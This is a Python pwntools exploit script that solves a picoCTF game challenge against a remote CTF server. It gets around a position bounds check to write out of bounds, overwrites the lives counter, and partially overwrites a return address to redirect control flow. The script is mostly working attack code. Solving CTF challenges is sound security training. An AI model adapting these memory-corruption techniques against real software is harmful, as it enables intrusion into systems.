import pwn

gdbscript = """
    tbreak main
    continue
"""

#p = pwn.process("./game")
p = pwn.remote("rhea.picoctf.net", 58045)
#p = pwn.gdb.debug("./game", gdbscript=gdbscript)

counter_off = 0xa8d
lives_off = -7
x_off = -11
y_off = -15
level_off = -19

class Position:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def move(self, p, steps, horiz=True):
        if not horiz:
            if steps >= 0:
                p.send(b"s"*steps)
            else:
                p.send(b"w"*abs(steps))
            self.y += steps
        else:
            if steps >= 0:
                p.send(b"d"*steps)
            else:
                p.send(b"a"*abs(steps))
            self.x += steps

    def write_32(self, p, val):
        payload = b""
        for i in range(4):
            byte = (val >> i*8) & 0xff
            payload += b"l" + int.to_bytes(byte)
            self.move(p, 1)
        p.send(payload)

# Levels 1-5
for level in range(1, 6):
    pos = Position(4, 4)
    # Go negative and circumvent primitive bounds check
    pos.move(p, -11)
    pos.move(p, -4, horiz=False)
    # Overwrite lives with 0x42424242
    pos.write_32(p, 0x42424242)

    # Go positive and circumvent primitive bounds check
    pos.move(p, 4, horiz=False)
    pos.move(p, 7)

    if level == 4:
        p.send(b"l\x70")
        # Overwrite lowest byte of return address to return further down in the main function
        pos.move(p, -55)
        pos.move(p, -4, horiz=False)
    elif level == 5:
        p.send(b"l\xf4")
        pos.move(p, -71)
        p.interactive()
        pos.move(p, -4, horiz=False)
    else:
        # Finish round
        p.send(b"p")

p.interactive()
